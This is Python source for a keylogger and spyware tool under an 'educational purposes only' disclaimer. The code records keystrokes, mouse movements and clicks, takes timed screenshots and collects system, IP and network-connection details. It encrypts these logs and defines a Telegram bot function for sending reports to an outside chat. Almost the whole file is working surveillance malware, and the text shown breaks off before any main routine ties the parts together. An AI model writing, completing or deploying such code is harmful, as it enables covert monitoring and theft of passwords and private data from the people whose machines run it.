# DISCLAIMER
# This script is for educational purposes only. Use it responsibly and ethically.
# Ensure you have permission to run this script on the system,
# and that its operation complies with all relevant laws and regulations.




# Standard library imports for network communication and system-level operations.
import socket  # Provides access to the BSD socket interface for networking.
import platform  # Access to underlying platform’s identifying data.

# Third-party import for interacting with the Windows clipboard.
import win32clipboard  # Allows Python code to access the Windows clipboard.

# Imports from the pynput library to capture keyboard and mouse events.
from pynput.keyboard import Listener as KeyListener  # Listener for keyboard events.
from pynput.mouse import Listener as MouseListener  # Listener for mouse events.

# Import threading for running different parts of the application concurrently.
import threading  # Enables the creation of threads for parallel execution.

# Import time for time-related functions.
import time  # Provides various time-related functions.

# Import from cryptography for encryption and decryption of logs.
from cryptography.fernet import Fernet  # Cryptographic recipes and primitives.

# Import get from requests for making HTTP requests (unused in this snippet).
from requests import get  # Simplifies making HTTP GET requests.

# Import pyautogui for programmatically controlling the mouse and keyboard.
import pyautogui  # GUI automation to simulate user interaction.

# Import psutil for retrieving system information and process management.
import psutil  # Provides an interface for retrieving information on system utilization.

# Import requests for making HTTP requests.
import requests  # Elegant and simple HTTP library for Python, built for human beings.


# File paths and settings
keys_information = "key_log.txt"
mouse_information = "mouse_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
file_path = "C:\\Users\\User\\PycharmProjects\\KeyLogger\\venv"
extend = "\\"
SEND_REPORT_EVERY = 60

# Telegram settings
telegram_token = 'your_telegram_bot_token'  # Replace with your token
telegram_chat_id = 'your_chat_id'  # Replace with your chat ID

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{telegram_token}/sendMessage"
        data = {
            "chat_id": telegram_chat_id,
            "text": message
        }
        response = requests.post(url, data=data)
        response.raise_for_status()
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

# Global flag for thread termination
stop_threads = False

# Function Definitions
def generate_encryption_key():
    key = Fernet.generate_key()
    with open(file_path + extend + 'filekey.key', 'wb') as filekey:
        filekey.write(key)
    return key

def encrypt_file(file_name, key):
    try:
        fernet = Fernet(key)
        with open(file_name, 'rb') as file:
            original = file.read()
        encrypted = fernet.encrypt(original)
        with open(file_name, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
    except Exception as e:
        print(f"Error encrypting file {file_name}: {e}")

def gather_system_information(file_name, key):
    try:
        with open(file_name, "w") as f:
            hostname = socket.gethostname()
            IP_address = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip + '\n')
            except Exception:
                f.write("Couldn't get Public IP Address\n")

            f.write("Processor: " + platform.processor() + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + IP_address + '\n')

            # Network information
            f.write("Network Information:\n")
            for interface, addrs in psutil.net_if_addrs().items():
                f.write(f"  Interface {interface}:\n")
                for addr in addrs:
                    f.write(f"    Address: {addr.address}\n")
                    if addr.netmask:
                        f.write(f"    Netmask: {addr.netmask}\n")
                    if addr.broadcast:
                        f.write(f"    Broadcast: {addr.broadcast}\n")

            # Active connections
            f.write("Current Network Connections:\n")
            for conn in psutil.net_connections(kind='inet'):
                f.write(f"  Local Address: {conn.laddr}\n")
                if conn.raddr:
                    f.write(f"  Remote Address: {conn.raddr}\n")
                f.write(f"  Status: {conn.status}\n")
            
            encrypt_file(file_name, key)
    except Exception as e:
        print(f"Error gathering system information: {e}")

class KeyLogger:
    def __init__(self, log_file, key):
        self.log_file = log_file
        self.key = key
        self.keys = []

    def on_press(self, key):
        self.keys.append(str(key).replace("'", ""))
        self.write_file()

    def write_file(self):
        with open(self.log_file, "a") as f:
            for key in self.keys:
                f.write(f"{key}\n")
        self.keys = []
        encrypt_file(self.log_file, self.key)

    def start(self):
        with KeyListener(on_press=self.on_press) as listener:
            while not stop_threads:
                listener.join(timeout=1)

class MouseLogger:
    def __init__(self, log_file, key):
        self.log_file = log_file
        self.key = key

    def on_move(self, x, y):
        with open(self.log_file, "a") as f:
            f.write(f"Mouse moved to ({x}, {y})\n")
        encrypt_file(self.log_file, self.key)

    def on_click(self, x, y, button, pressed):
        with open(self.log_file, "a") as f:
            action = 'pressed' if pressed else 'released'
            f.write(f"Mouse {action} at ({x}, {y}) with {button}\n")
        encrypt_file(self.log_file, self.key)

    def start(self):
        with MouseListener(on_move=self.on_move, on_click=self.on_click) as listener:
            while not stop_threads:
                listener.join(timeout=1)

class ScreenCapture:
    def __init__(self, file_path, interval, duration, key):
        self.file_path = file_path
        self.interval = interval
        self.duration = duration
        self.key = key

    def capture(self):
        start_time = time.time()
        while (time.time() - start_time) < self.duration and not stop_threads:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            screenshot_filename = f"screenshot_{timestamp}.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(self.file_path + screenshot_filename)
            encrypt_file(self.file_path + screenshot_filename, self.key)
            time.sleep(self.interval)